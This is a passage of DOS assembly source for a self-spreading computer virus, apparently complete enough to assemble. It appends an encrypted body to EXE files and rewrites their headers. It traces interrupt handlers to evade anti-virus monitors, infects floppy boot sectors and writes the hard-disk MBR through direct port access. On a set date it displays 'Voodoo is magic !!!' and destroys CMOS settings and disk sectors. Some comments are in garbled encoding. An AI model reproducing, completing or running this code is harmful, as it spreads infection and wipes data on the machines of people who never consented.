              cmp al,0
              jne noFDD
              push cs
              pop es
              push cs
              pop ds
              call test_name
              push es
              mov ax,3524h
              int int21h
              mov word ptr cs:[olld0x24h],bx
              mov word ptr cs:[olld0x24h+2],es
              pop es
              push cs
              pop ds
              mov ax,2524h
              mov dx,offset int24h
              int int21h
             mov ax,4300h
             mov dx,filename
             push cs
             pop ds
             int int21h
             mov cs:[fileATR],cx ;save atr
             ;set 20h atr
             mov ax,4301h
             mov cx,20h
             int int21h
             jnc noerrors
             jmp ErrorAcc
             ;open file
   noerrors:
             mov ax,3d02h
             int int21h
             mov bx,ax
             mov cs:[hendler],ax
             mov ax,5700h ; read sec
             int int21h
             and  cl,1ch
             cmp  cl,1ch
             je It_is_56sec
             ;read headr
             ;-------------------------------------
             ; €‚* ®ç¥ì áª¥¯â¥ç¥áª¨ ®â®á¨âáï ª äãªæ¨¨ 3Fh INT 21h
             ; ¯®íâ®¬ã ¯à¨è«®áì ¨§¢à â¨âìáï
              db 60h
              MOV AX,0CCCCH
              mov  bp,03f00h
              mov cx,24
              mov dx,hade_exe
              call trac21h
              db 61h
             ;-------------------------------------
             ;int int21h
              push cs
              pop ds
              push cs
              pop es
             mov di,hade_exe
             mov ax,[di]
             cmp ax,'MZ'
             je YesExe
             cmp ax,'ZM'
             jne It_is_56sec ; not exe
   YesExe:   call randomaze
            ;- * áâà®©ª  å¥¤¥à  --
            ;---- save oldIP,oldCS --------
             push cs
             push cs
             pop ds
             pop es
             mov di,offset oldIP__  ;save CS:IP
             mov si,ExeIP
             mov cx,2
             cld
             rep movsw
             mov si,ReloSS          ; save SS:SP
             mov cx,2
             cld
             rep movsw
            ;; to be continion
            call Make_Vbady
             ;---- Count chksum   -----------
             ;-  ¯®«ãç¨¬ à §¬¥à ------------
              MOV BX,[hendler]
              mov ax,4202h
              xor cx,cx
              xor dx,dx
              int int21h
              cmp dx,4h
              jg  It_is_56sec
             ;-----------------------------------
              mov word ptr cs:[filesize],ax
              mov word ptr cs:[filesize+2],dx
              mov word ptr cs:[dwr],ax
              mov word ptr cs:[dwr+2],dx
             ;---„®¯¨áë¢ ¥¬ bady ---------------
               jmp tonext
   It_is_56sec: jmp It_is_56sec2
   tonext:
               ; ”ãªæ¨î 40h €‚* â®¦¥ ¥ «î¡¨â
               ; ç¥¬ ¡®«ìè¥ ‘• â¥¬ ¡®«ìè¥ ¥£® ¥ ¢¨áâì.
               db 60h
               mov bx,[hendler]
               MOV AX,0CCCCH
               mov  bp,04000h
               mov ah,40h
               mov dx,offset @End
               mov cx,sizeV
               add cx,cs:[desh_size]
               call trac21h
               db 61h
              mov cx,4
              xor bx,bx
              call shrdd
              XOR bx,bx
              mov cx,4
              call cs:[shldd]
              mov word ptr cs:[filesize],ax
              mov word ptr cs:[filesize+2],dx
              mov ax,word ptr cs:[dwr]
              mov Dx,word ptr cs:[dwr+2]
              sub ax,word ptr cs:[filesize]
              sbb dx,word ptr cs:[filesize+2]
              mov cs:[ExeIP],ax ; new IP to EOF
   ;-------------Count ReloCS------------------
                mov ax,word ptr cs:[dwr]
                mov dx,word ptr cs:[dwr+2]
                mov cx,4
                xor bx,bx
                call shrdd
                sub ax,cs:[Hdrsize]
                mov cs:[ReloCS],ax       ;
                mov cs:[ReloSS],ax       ;
                mov ax,0fffeh
                mov cs:[ExeSP],ax
         ;---- Count PageCnt -----------------
             mov ax,cs:[desh_size]
             add ax,sizeV
             xor bx,bx
             add ax,word ptr cs:[dwr]
             adc dx,word ptr cs:[dwr+2]
             mov word ptr cs:[filesize],ax      ;new file size
             mov word ptr cs:[filesize+2],dx ;
            ;-- PageCnt:=(filesie div 512 )+1
             mov cx,9
             xor bx,bx
             call shrdd ;div 512
             add ax,1          ;+1
             mov cs:[PageCnt],ax
            ;---- Count partPag ----
            mov ax,word ptr cs:[filesize]
            mov dx,word ptr cs:[filesize+2]
             mov word ptr cs:[dwr],ax
             mov word ptr cs:[dwr+2],dx
             mov cx,9
             xor bx,bx
             call shrdd
             xor bx,bx
             mov cx,9
             call shldd
            mov word ptr cs:[filesize],ax
            mov word ptr cs:[filesize+2],dx
            mov ax,word ptr cs:[dwr]
            mov dx,word ptr cs:[dwr+2]
            sub ax,word ptr cs:[filesize]
            sbb dx,word ptr cs:[filesize+2]
            mov cs:[partPag],ax
            ;NEW Heder COMPLET
   ;----- Write new hade_exe --------
              MOV BX,[hendler]
              mov ax,4200h
              xor cx,cx
              xor dx,dx
              int int21h  ;seek to 0:0
               mov bx,[hendler]
               mov cx,4000h
               push cx
               pop ax
               mov dx,hade_exe
               mov cx,18h
               int int21h   ; § ¯¨áì new heder
           ; make 56 sec
            mov ax,5700h
            mov bx,cs:[hendler]
            iNT int21h
            mov ax,5701h
            and cx,1111111111100000b
            or  cl,1Ch
            INT  21h
   It_is_56sec2:
            mov bx,cs:[hendler]
            mov ah,3eh
            INT int21h
            mov dx,filename
            mov ax,4301h
            mov cx,cs:[fileATR]
            int int21h
            ;close file , set old atr
   ErrorAcc:push ds
           mov ds,word ptr cs:[olld0x24h+2]
           mov dx,word ptr cs:[olld0x24h]
           mov ax,2524h
           int int21h
           pop ds
             ret
   ;-----------------------------------------------
   detectint21and13h:
                      PUSH DS             ;
                      PUSH ES             ;
                      MOV  AH,52H         ;*®«ãç ¥â List of List
                      INT  21H            ;
                      MOV  CX,ES:[BX-02]  ; cX:=baseMCB
                      pop  es
                      push es
                     ;---- Save int 01 in addres01hTR ------
                      xor ax,ax
                      PUSH AX
                      POP DS
                      MOV  DS:[baseMCBCS],CX  ; 0:[baseMCBCS] :=CX
                      MOV SI,04H
                      MOV CX,2
                      POP ES
                      PUSH ES
                      MOV DI,addres01hTR
                      REP   MOVSW
                      ;----- Set new int 01 ----
                      mov ax,offset new_01h
                      cli
                      mov ds:[04],ax
                      mov ax,cs
                      mov ds:[06],ax
                      sti
                      push ds
                      push es
                     ;- Tras 13 -----------
                      CALL ProcSetTF_1
                      mov ax,0ffffh
                      PUSHF
                      CALL DWORD PTR DS:[04CH]
                      CALL ProcSetTF_0
                     ;---------------------
                     ; ret push ax
                     mov byte ptr cs:[new_01h],50h
                     ;- Tras 21 -----------
                      CALL ProcSetTF_1
                      mov ax,0ffffh
                      PUSHF
                      CALL DWORD PTR DS:[084H]
                      CALL ProcSetTF_0
                      ;----- Ret old int 01 ----
                      pop es
                      pop ds
                      cli
                      mov ax,es:[addres01hTR]
                      mov ds:[04],ax
                      mov ax,es:[addres01hTR+2]
                      mov ds:[06],ax
                      sti
                      sub1  equ next_comm_01-new_01h
                      mov byte ptr cs:[new_01h],50h
                      mov word ptr cs:[MAKeGOOD],8926h
                      ;------------
                      mov ax,word ptr ds:[addres21hCS+2]
                      or  ax,ax
                      jz  Errrr
                      mov ax,ds:[baseMCBCS]
                      cmp ax,word ptr ds:[addres21hCS+2]
                      jge No_Error
   Errrr:             mov ax,ds:[4ch]
                      mov ds:[addres13hCS],ax
                      mov ax,ds:[4ch+2]
                      mov ds:[addres13hCS+2],ax
                      mov ax,ds:[84h]
                      mov ds:[addres21hCS],ax
                      mov ax,ds:[84h+2]
                      mov ds:[addres21hCS+2],ax
                      mov ax,6666h
   No_Error:          POP ES
                      POP DS
   AccDen:            RET
   baseMCBCS    equ 202h
   addres13hCS  equ baseMCBCS+2
   addres21hCS  equ addres13hCS+4
   new_01h:  push ax
             push bx
             push bp
             push di
             push es
             call next_comm_01
   next_comm_01:pop di
             xor ax,ax
             mov es,ax
             mov bp,sp
             mov bx,[bp+06+4]
             mov ax,[bp+08+4]
   MAKeGOOD: mov word ptr es:[addres13hCS],bx
             mov word ptr es:[addres13hCS+2],ax
             db 0c1h  ;shr bx,4
             db 0ebh  ;
             db 004h  ;
             add ax,bx
             cmp ax,0F000h
             JB Exit_int01
             cmp ax,0ffffh
             JA    Exit_int01   ;
   set_iret: mov byte ptr cs:[di-sub1],0cfh
             mov word ptr cs:[di-sub1+14+7],26ebh
             jmp Exit_int01
             mov word ptr es:[addres21hCS],bx
             mov word ptr es:[addres21hCS+2],ax
             db 0c1h  ;shr bx,4
             db 0ebh  ;
             db 004h  ;
             add ax,bx
             cmp es:[baseMCBCS],ax
             JBE Exit_int01
             jmp set_iret
   Exit_int01:
             pop es
             pop di
             pop bp
             pop bx
             pop ax
             iret
   Infect_FDD:
              mov dx,0
              mov cx,01
              mov bx,offset @end
              push cs
              pop es
              mov ax,0201h ;
              call calling13h
              mov ax,0301h ;
              call calling13h
              jc   AccDen
              push es
              call Get_FDD_Param
              pop es
              inc ch ; “¢¥«. æ¨«¨¤à
               pusha
               mov ah,ch
               mov al,1
               mov ch,0
               mov bx,offset @End
   makeTab2FDD:
               mov cs:[bx],ah ;cil
               mov cs:[bx+1],dh ;head
               mov cs:[bx+2],al ;nomsec
               mov byte ptr cs:[bx+3],2  ;size
               add bx,4
               inc al
               loop makeTab2FDD
               popa
               pusha
               mov ah,05h
               mov al,09 ; count of sectors on fdd
               mov dl,0 ;drive
               mov cl,01h ;sec
               mov bx,offset @End
               push cs
               pop es
               call calling13h
               mov ax,0201h
               mov bx,offset @End
               mov cx,01h
               mov dx,0000
               call calling13h
               popa
               pusha
               mov ax,0301h             ; save old Boot
               mov cl,1                 ;
               mov dl,0                 ;
               mov bx,offset @End       ;
               call calling13h          ;
               ; patch boot
              push ds
              push cs
              pop ds
              mov es:[bx],03cebh
              add bx,03eh
              mov di,bx
              mov si,offset  new_bootFDD
              mov cx, offset End_new_bootFDD - offset new_bootFDD
              cld
              rep movsb
              pop ds
               ; save new boot 2 -> 0 0 1
               mov ax,0301h             ;
               mov cx,01                ;
               mov dx,0                 ;
               mov bx,offset @End
               call calling13h                  ;
               ;---------
               call Make_Cript_Bady
               popa
               mov ax,0309h             ; save 2 FDD Cript BAdy
               mov cl,2                 ;
               mov dl,0                 ;
               mov bx,offset @End       ;
               call calling13h
               mov ax,0301h
               mov cl,10h                        ;
               mov dl,0                          ;
               mov bx,offset   DecripterBOOT     ;
               call calling13h
               ret

   ProcSetTF_1:       PUSHF
                      POP  AX
                      OR   AX,0100h
                      PUSH AX
                      POPF
                      RET
   ProcSetTF_0:       PUSHF
                      POP  AX
                      AND  AX,0FEFFh
                      PUSH AX
                      POPF
                      RET
   ; new bootFDD
     new_bootFDD:
        int 12h
        db 0c1h,0e0h,06h
        sub ax,Memlimit;
        mov es,ax
        PUSH AX
        ;LOAD BADY
        push es
        mov ah,08h
        mov dl,0
        int 13h
        pop es
        inc ch  ; cil
        mov cl,2
        mov ax,0209h;
        mov dl,0
        mov  bx,100h
        int 13h
        pop ax
       ;----------
        SUB ax,16
        mov es,ax
       ;load decriptor
        xor bx,bx
        mov cl,10h      ; decriptor
        mov ax,0201h
        int 13h
        mov bp,0FDDh
        push es
        push bx
        retf
   End_new_bootFDD:

   randomaze:
      push es
      call mov_es_0000h
      IN AL,40H
      MOV AH,AL
      IN AL,40H
      mov word ptr cs:[RandSeed],ax
      mov ax,word ptr es:[46ch]
      mov word ptr cs:[RandSeed+2],ax
      pop es
      ret
   ; --------------------
   RandSeed  dd 0000h
   ww        dw 8405h
   ; Random
   random:
   mov ax,WORD PTR cs:[RandSeed ]
   mov bx,WORD PTR cs:[RandSeed+2]
   mov cx,ax
   mul cs:word ptr cs:[ww]
   SHL cx,1
   shl cx,1
   shl cx,1
   add dx,cx
   add dx,bx
   shl bx,1
   shl bx,1
   add dx,bx
   add dh,bl
   mov cl,05
   shl bx,cl
   add ax,0001
   adc dx,0
   mov WORD PTR cs:[RandSeed],ax
   mov WORD PTR cs:[RandSeed+2],dx
   mov bx,sp
   mov cx,dx
   mul ss:word ptr [bx+4]
   mov ax,cx
   mov cx,dx
   mul ss:word ptr [bx+4]
   add ax,cx
   adc dx,00
   mov ax,dx
   retf 0002
   ;--------------------------------------------
   delay:
   push cx
   mov cx,0fffh
   e1: loop e1
   pop cx
   ret
   LOGO:
     pusha
     mov ah,04h
     int 1ah
     cmp dx,1207h
     jne note
   ;---EEEE----------------
     call kill_CMOS
     call kill_FAT
     mov ax,0013h
     int 10h
     mov dx,0909h
     mov ax,1300h
     push cs
     pop es
     mov bp,offset mesb
     MOV CX,mese-mesb
     mov bx,04
     int 10h
     mov cx,0ffffh
     _ch:
     mov dx, 3c8h
     mov al,4
     out dx,al
     inc dx
     mov al,cl
     out dx,al
     mov al,0
     out dx,al
     out dx,al
     dec dx
     out dx,al
     inc dx
     mov al,ch
     out dx,al
     mov al,0
     out dx,al
     out dx,al
     call  delay
     loop _ch
     mov ah,0
     int 16h
     note:
     popa
    ret
    mesb:
     db 'Voodoo is magic !!!'
   mese:
   ;----- Write mbr ----------------------------
   writeMBR_PORT:
   ;
           MOV DX,1F6H
           MOV AL,0A0H     ;Drive descriptor
           OUT DX,AL
   ;
   SECTCOUNT1  EQU  01h
           MOV DX,1F2H
           MOV AL,SECTCOUNT1
           OUT DX,AL
   ;
   SECTNUM1    EQU 01h
       OFF     EQU 0h
       ON      EQU 1h
           MOV DX,1F3H
           MOV AL,SECTNUM1
           OUT DX,AL
           MOV DX,1F4H; LOW
           MOV AL,OFF
           OUT DX,AL
           MOV DX,1F5H ; HIGH
           MOV AL,OFF
           OUT DX,AL
           MOV DX,1F7H
           MOV AL,030H     ;writeSECT
           OUT DX,AL
   ;
   GWORD:  MOV DX,1F7H
           IN AL,DX
           TEST AL,8       ;Wait for data
           JZ GWORD
           push ds
           mov ax,cs
           mov ds,ax
           MOV CX,256
           MOV SI,offset @end
           MOV DX,1F0H     ;Get data
   GLOOP:  LODSW
           OUT DX,AX
   ;       STOSW
           LOOP GLOOP
           pop ds
           CALL WAITHD
                   MOV DX,3F6H     ;Turn on IRQ 14 and exit
                   MOV AL,on
                   OUT DX,AL
           ret
   WAITHD: MOV DX,1F7H
           IN AL,DX
           cmp al,0ffh
           je WIDOZY
           TEST AL,128
           JNZ WAITHD
           RET
   WIDOZY:mov bx,066ffh
          ret
   ;________ procedure shr dd___________________________
   ;paramestrs AX=LoDD,DX=HiDD,CX=count bits
   ; reterns   ddWORD(DX,AX)
   shrDD: db 0fh
          db 0adh
          db 0d0h
          shr dx,cl
          ret
   ;________ procedure shl dd___________________________
   ;paramestrs AX=LoDD,DX=HiDD,CX=count bits
   ; reterns   ddWORD(DX,AX)
   shlDD: db 0fh
          db 0a5h
          db 0c2h
          shl ax,cl
          ret
   DecripterBOOT:
   ; Decripter 0 0 2
               call start
   start:      pop bx
               sub bx,3
               add bx,512
               push cs
               pop es
               mov cx,sizeV
   RCRkeyBoot: mov ah,00h   ;RCRkey
               call decriptMBR
               push cs
               pop ax
               add ax,16
               push ax
               mov ax,offset BOOT_ENTEre_point ; entry point
               push ax
               retf
   kill_FAT:     mov ax,03ffh
                 mov dx,0180h
                 mov cx,0001h
                 int 13h
                 ret
   kill_CMOS:    mov al,2eh
                 out 70h,al
                 mov al,0ffh
                 out 71h,al
                 mov al,2fh
                 out 70h,al
                 mov al,0ffh
                 out 71h,al
                 ret
   decriptMBR:
   devr:       mov al,byte ptr es:[bx]
               add ah,cl
               xor al,ah
               mov byte ptr es:[bx],al
               inc bx
               loop devr
               ret
   ;---------------------------------------
   @end:
   Code ENDS
        END BEGIN
   ;===== Cut ====
